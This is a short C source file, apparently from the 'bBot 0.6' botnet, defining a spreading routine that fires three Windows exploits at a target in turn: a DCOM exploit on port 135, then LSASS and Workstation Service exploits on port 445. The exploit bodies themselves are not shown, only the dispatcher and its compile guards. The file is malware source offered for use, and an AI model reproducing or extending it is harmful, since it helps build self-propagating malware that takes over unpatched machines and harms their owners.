//WKSdcass OTHER - bBot 0.6 Exclusive!! -- I Think, ive never seen it on another bawt =)

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_WKSSVC
#ifndef NO_WKSDCASSOTHER

BOOL wksdcassother(EXINFO exinfo)
 {
	exinfo.port = 135;
	BOOL bDCOM = dcom2(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);
	exinfo.port = 445;
	BOOL bWKSSVC = ScriptGod_WKSSVC_Other(exinfo);

	return bDCOM || bLSASS || bWKSSVC ? TRUE : FALSE;
}
#endif
#endif
#endif
#endif